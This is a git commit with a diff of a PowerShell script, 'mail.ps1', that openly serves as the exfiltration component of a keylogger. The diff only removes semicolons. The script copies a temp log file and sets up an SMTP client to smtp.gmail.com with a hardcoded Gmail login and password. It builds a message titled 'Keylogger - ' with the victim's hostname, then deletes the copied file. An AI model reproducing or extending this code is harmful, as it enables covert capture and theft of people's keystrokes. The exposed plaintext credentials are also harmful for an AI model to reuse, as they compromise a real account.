fbc1e40f94157eea1691008fd418b2f15bbbb81e
Miguel Angel Rocha Vázquez <miguel_rocha00715@hotmail.com>
2017-08-25 20:40:31 -0500

    Update mail.ps1

--- mail.ps1
+++ mail.ps1
@@ -1,13 +1,13 @@
-New-item -path $ENV:temp\test –type directory;
+New-item -path $ENV:temp\test –type directory
 Copy-Item -Path $env:temp\testing123.txt -Destination $env:temp\test\
-timeout 10;
-$SMTPServer = 'smtp.gmail.com';
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);
-$SMTPInfo.EnableSsl = $true;
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pruebapoloa@gmail.com', 'polopolo123');
-$ReportEmail = New-Object System.Net.Mail.MailMessage;
-$ReportEmail.From = 'pruebapoloa@gmail.com';
-$ReportEmail.To.Add('pruebapoloa@gmail.com');
-$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName;
-timeout 10;
-Remove-Item $env:temp\test\testing123.txt;
+timeout 10
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pruebapoloa@gmail.com', 'polopolo123')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'pruebapoloa@gmail.com'
+$ReportEmail.To.Add('pruebapoloa@gmail.com')
+$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+timeout 10
+Remove-Item $env:temp\test\testing123.txt
